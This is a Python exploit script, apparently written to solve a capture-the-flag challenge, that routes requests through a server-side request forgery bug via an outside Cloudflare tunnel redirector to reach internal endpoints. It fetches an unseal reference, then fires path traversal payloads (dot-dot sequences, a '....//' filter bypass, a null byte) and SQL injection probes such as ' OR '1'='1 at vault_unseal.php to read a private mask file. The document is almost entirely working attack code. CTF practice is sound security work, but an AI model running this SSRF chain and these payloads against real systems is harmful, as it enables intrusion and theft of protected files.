#!/usr/bin/env python3
"""
Is vault_unseal's `ref` a filesystem or SQL lookup key? It's the only NEW
file on the deployed build that reads /var/www/private/cap.mask, and its ref is
not in the ruled-out traversal list. Eight requests, through the proven SSRF.
"""
import json, sys, time, urllib.parse, requests
import os
BASE = open(os.path.expanduser("~/ctf-tools/VK-BASE.txt")).read().strip().rstrip("/")
REDIR = "https://jan-pharmaceuticals-object-representatives.trycloudflare.com"
S = requests.Session()

def ssrf(target):
    u = (BASE + "/api/fetch_source.php%3Fa.php?url="
         + urllib.parse.quote(REDIR + "/r/" + target, safe=""))
    try:
        return S.get(u, timeout=60).json().get("trace", "")
    except Exception as e:
        return "<ERR %s>" % e

kr = ssrf("http://127.0.0.1/api/keyring.php")
print("keyring:", kr[:200])
try:
    ref = json.loads(kr)["unseal_ref"]
except Exception:
    print("no ref, stopping"); sys.exit(1)
base_body = ssrf("http://127.0.0.1/api/vault_unseal.php?ref=" + ref)
print("baseline:", base_body[:200])

cands = [
    "../../../private/cap.mask",
    "....//....//....//private/cap.mask",
    "/var/www/private/cap.mask",
    ref + "/../../../../var/www/private/cap.mask",
    ref + "%00",
    ref + "'",
    ref + "' OR '1'='1",
]
for c in cands:
    time.sleep(0.6)
    b = ssrf("http://127.0.0.1/api/vault_unseal.php?ref=" + urllib.parse.quote(c, safe=""))
    same = "SAME" if b == base_body else "DIFF"
    print("%-40s %s %s" % (c[:40], same, b[:160]))
